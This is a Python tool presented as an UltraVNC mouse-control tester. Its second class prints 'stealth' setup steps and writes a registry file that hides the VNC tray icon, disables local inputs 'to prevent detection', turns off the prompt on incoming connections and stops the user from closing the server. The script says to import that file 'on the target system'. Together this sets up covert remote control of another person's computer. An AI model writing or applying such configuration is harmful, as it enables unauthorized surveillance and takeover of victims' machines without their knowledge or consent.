#!/usr/bin/env python3
"""
UltraVNC Mouse Control Configuration
For remote mouse control testing and setup
"""

import subprocess
import time
import json
from pathlib import Path

class UltraVNCGestureTest:
    def __init__(self, target_ip, port=5900):
        self.target_ip = target_ip
        self.port = port
        self.test_results = []
    
    def test_mouse_connection(self):
        """Test if mouse control is working"""
        print("🖱️ Testing UltraVNC Mouse Control")
        print("=" * 40)
        
        # Test 1: Basic connection
        print("1. Testing basic VNC connection...")
        if self.test_vnc_connection():
            print("✅ VNC connection successful")
        else:
            print("❌ VNC connection failed")
            return False
        
        # Test 2: Mouse control check
        print("\n2. Testing mouse control...")
        print("Connect to VNC and try these actions:")
        print("   - Move mouse cursor")
        print("   - Left-click on desktop")
        print("   - Right-click on desktop")
        print("   - Drag an icon")
        print("   - Scroll mouse wheel")
        
        input("\nPress Enter after testing mouse control...")
        
        # Test 3: Check for common issues
        print("\n3. Checking common mouse issues...")
        self.check_mouse_issues()
        
        return True
    
    def test_vnc_connection(self):
        """Test VNC connection"""
        try:
            result = subprocess.run(
                ['nc', '-zv', self.target_ip, self.port],
                capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def check_mouse_issues(self):
        """Check for common mouse control issues"""
        issues = []
        
        print("Common mouse control issues and solutions:")
        
        # Issue 1: Viewer inputs disabled
        print("\n🔍 Issue: Viewer inputs disabled")
        print("Solution: On UltraVNC Server:")
        print("  1. Right-click tray icon → Admin Properties")
        print("  2. Check 'Enable Viewer inputs'")
        print("  3. Uncheck 'Disable Viewer inputs'")
        
        # Issue 2: Local inputs enabled (conflict)
        print("\n🔍 Issue: Local user interfering")
        print("Solution: On UltraVNC Server:")
        print("  1. Admin Properties → Keyboard & Mouse")
        print("  2. Check 'Disable Local inputs'")
        print("  3. This prevents local user from controlling mouse")
        
        # Issue 3: Multiple viewers
        print("\n🔍 Issue: Multiple viewers connected")
        print("Solution: On UltraVNC Server:")
        print("  1. Admin Properties → Multi Viewer connections")
        print("  2. Select 'Disconnect all existing connections'")
        print("  3. This ensures only you control the mouse")
        
        # Issue 4: Screen resolution
        print("\n🔍 Issue: Screen resolution mismatch")
        print("Solution: On UltraVNC Viewer:")
        print("  1. Options → Screen resolution")
        print("  2. Match remote screen resolution")
        print("  3. Try 'Auto' or specific resolution")
    
    def generate_mouse_test_script(self):
        """Generate automated mouse test script"""
        script = f'''#!/bin/bash
# UltraVNC Mouse Control Test Script
# Target: {self.target_ip}:{self.port}

echo "Starting mouse control test..."
echo "Connect to: vnc://{self.target_ip}:{self.port}"
echo ""

# Open VNC connection
open "vnc://{self.target_ip}:{self.port}"

echo "Once connected, perform these tests:"
echo "1. Move mouse to each corner of screen"
echo "2. Left-click on desktop"
echo "3. Right-click on desktop"
echo "4. Double-click on an icon"
echo "5. Drag an icon across screen"
echo "6. Scroll mouse wheel"
echo "7. Test middle-click (if available)"
echo ""

read -p "Did all mouse actions work? (y/n): " response

if [ "$response" = "y" ]; then
    echo "✅ Mouse control working correctly"
else
    echo "❌ Mouse control issues detected"
    echo "Check UltraVNC Server settings"
fi
'''
        
        script_path = Path.home() / f"mouse_test_{self.target_ip.replace('.', '_')}.sh"
        with open(script_path, 'w') as f:
            f.write(script)
        
        script_path.chmod(0o755)
        print(f"Created mouse test script: {script_path}")
        return script_path

class UltraVNCStealthMouse:
    def __init__(self):
        self.stealth_settings = {
            'remove_tray_icon': True,
            'disable_local_inputs': True,
            'hide_cursor': False,
            'silent_mode': True
        }
    
    def configure_stealth_mouse(self):
        """Configure UltraVNC for stealth mouse control"""
        print("🕵️ Configuring UltraVNC for Stealth Mouse Control")
        print("=" * 50)
        
        config_instructions = r'''
UltraVNC Server Stealth Configuration:

1. Hide UltraVNC Presence:
   - Edit ultravnc.ini
   - Add: RemoveTrayIcon=1
   - Add: DisableTrayIcon=1

2. Mouse Control Settings:
   - Admin Properties → Keyboard & Mouse
   - ✅ Enable Viewer inputs
   - ✅ Disable Local inputs (prevents detection)
   - ✅ Disable clients options in tray icon menu

3. Connection Settings:
   - Admin Properties → Incoming connections
   - ✅ Accept Socket Connections
   - Port: 5900 (or custom port)
   - ❌ Query on incoming connection

4. Security Settings:
   - Set VNC password
   - ❌ Require MS-Logon (simpler)
   - ✅ Forbid user to close down WinVNC

5. Advanced Stealth:
   - Admin Properties → Miscellaneous
   - ✅ Remove Wallpaper for Viewers (faster)
   - ❌ Enable Blank Monitor (obvious)
   - ✅ Disable Tray icon

Registry Keys for Stealth:
[HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3]
"RemoveTrayIcon"=dword:00000001
"DisableTrayIcon"=dword:00000001
"DisableLocalInputs"=dword:00000001
'''
        
        print(config_instructions)
        
        # Generate registry script
        reg_script = r'''
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3]
"RemoveTrayIcon"=dword:00000001
"DisableTrayIcon"=dword:00000001
"DisableLocalInputs"=dword:00000001
"AllowLoopback"=dword:00000000
"AuthRequired"=dword:00000001
'''
        
        script_path = Path.cwd() / "ultravnc_stealth_mouse.reg"
        with open(script_path, 'w') as f:
            f.write(reg_script)
        
        print(f"\nCreated registry script: {script_path}")
        print("Import this registry file on the target system")
        
        return script_path

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("UltraVNC Mouse Control Tools")
        print("Usage:")
        print("  python3 ultravnc_mouse_config.py test <IP>")
        print("  python3 ultravnc_mouse_config.py stealth")
        return
    
    command = sys.argv[1]
    
    if command == "test" and len(sys.argv) >= 3:
        target_ip = sys.argv[2]
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 5900
        
        tester = UltraVNCGestureTest(target_ip, port)
        tester.test_mouse_connection()
        tester.generate_mouse_test_script()
    
    elif command == "stealth":
        stealth = UltraVNCStealthMouse()
        stealth.configure_stealth_mouse()
    
    else:
        print("Unknown command")

if __name__ == "__main__":
    main()
